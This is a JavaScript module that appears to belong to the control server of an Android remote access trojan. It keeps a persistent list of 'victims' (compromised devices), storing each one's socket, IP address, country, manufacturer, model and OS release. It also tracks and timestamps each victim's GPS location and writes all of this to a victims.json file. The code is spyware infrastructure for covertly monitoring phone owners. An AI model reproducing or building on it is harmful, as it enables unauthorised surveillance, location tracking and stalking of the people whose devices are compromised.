 var Victim = function(socket, ip, port, country, manf, model, release) {
     this.socket = socket;
     this.ip = ip;
     this.port = port;
     this.country = country;
     this.manf = manf;
     this.model = model;
     this.release = release;
     this.lat = null;
     this.lng = null;
     this.locationEnabled = false;
     this.lastLocationAt = null;
 };

 const fs = require("fs-extra");
 const path = require("path");
 const homeDir = require("homedir");
 const CONSTANTS = require(__dirname + '/../Constants');

 const dataPath = path.join(homeDir(), CONSTANTS.dataDir);
 const victimsFile = path.join(dataPath, 'victims.json');




 class Victims {
     constructor() {
         this.victimList = {};
         this.instance = this;
         this.loadVictims();
     }

     addVictim(socket, ip, port, country, manf, model, release, id) {
         var victim = new Victim(socket, ip, port, country, manf, model, release);
         this.victimList[id] = victim;
         this.saveVictims();
     }

     getVictim(id) {
         if (this.victimList[id] != null)
             return this.victimList[id];

         return -1;
     }

     updateLocation(id, lat, lng, enable) {
         if (this.victimList[id] == null) return;
         this.victimList[id].lat = lat;
         this.victimList[id].lng = lng;
         this.victimList[id].locationEnabled = enable;
         this.victimList[id].lastLocationAt = new Date().toISOString();
         this.saveVictims();
     }

     getVictimIdBySocket(socket) {
         for (let id in this.victimList) {
             if (this.victimList[id].socket === socket) return id;
         }
         return null;
     }

     rmVictim(id) {
         delete this.victimList[id];
         this.saveVictims();
     }

     getVictimList() {
         return this.victimList;
     }

     saveVictims() {
         try {
             fs.ensureDirSync(dataPath);
             const victimData = {};
             for (let id in this.victimList) {
                 const victim = this.victimList[id];
                 victimData[id] = {
                     ip: victim.ip,
                     port: victim.port,
                     country: victim.country,
                     manf: victim.manf,
                     model: victim.model,
                     release: victim.release,
                     lat: victim.lat,
                     lng: victim.lng,
                     locationEnabled: victim.locationEnabled,
                     lastLocationAt: victim.lastLocationAt
                 };
             }
             fs.writeFileSync(victimsFile, JSON.stringify(victimData, null, 2), 'utf8');
         } catch (err) {
             console.error('Error saving victims:', err);
         }
     }

     loadVictims() {
         try {
             if (fs.existsSync(victimsFile)) {
                 const data = fs.readFileSync(victimsFile, 'utf8');
                 const victimData = JSON.parse(data);
                 for (let id in victimData) {
                     const victim = victimData[id];
                     const victimObj = new Victim(null, victim.ip, victim.port, victim.country, victim.manf, victim.model, victim.release);
                     if (victim.lat != null) victimObj.lat = victim.lat;
                     if (victim.lng != null) victimObj.lng = victim.lng;
                     if (victim.locationEnabled != null) victimObj.locationEnabled = victim.locationEnabled;
                     if (victim.lastLocationAt != null) victimObj.lastLocationAt = victim.lastLocationAt;
                     this.victimList[id] = victimObj;
                 }
             }
         } catch (err) {
             console.error('Error loading victims:', err);
         }
     }

 }



 module.exports = new Victims();